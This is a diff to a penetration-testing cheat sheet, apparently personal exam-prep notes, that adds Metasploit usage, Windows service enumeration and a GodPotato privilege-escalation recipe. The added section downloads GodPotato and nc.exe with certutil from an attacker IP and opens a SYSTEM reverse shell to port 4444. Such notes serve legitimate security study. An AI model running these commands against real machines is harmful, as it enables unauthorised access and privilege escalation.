@@ -109,6 +109,14 @@ searchsploit -m windows/remote/48537.py
 searchsploit -m 42031
 ```
 
+##### Metasploit
+
+``` sh
+msfconsole
+# Open HTML file with module information
+info -d 
+```
+
 #### Command Injection
 
 [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
@@ -444,7 +452,7 @@ evil-winrm -i IP -u USER -p "PASS"
 # Serve winPEAS from home directory and download
 cp /usr/share/peass/winpeas/winPEASx64.exe .
 python3 -m http.server 80
-iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
+iwr -uri http://IP/winPEASx64.exe -Outfile winPEAS.exe
 .\winPEAS.exe
 ```
 
@@ -457,6 +465,7 @@ Get-Service
 Get-CimInstance
 # Example
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+wmic service get name,startname
 
 # Enumerate binary permissions, look for write 
 icacls "PATH_TO_BINARY"
@@ -558,6 +567,23 @@ move .\BackendCacheCleanup.exe .\Pictures\
 # Check if it worked
 net user
 net localgroup administrators
+```
+
+##### SeImpersonatePrivilege
+
+``` ps1
+# GodPotato
+# Check privilege
+whoami /priv
+# Check .NET version
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+# Download GodPotato
+certutil -urlcache -split -f http://192.168.45.235/GodPotato-NET4.exe
+# Test GodPotato
+.\GodPotato-NET4.exe -cmd "whoami"
+# Get netcat for reverse shell
+certutil -urlcache -split -f http://192.168.45.235/nc.exe
+.\GodPotato-NET4.exe -cmd "nc.exe 192.168.45.235 4444 -e cmd"
 ```
 
 ##### Code Samples
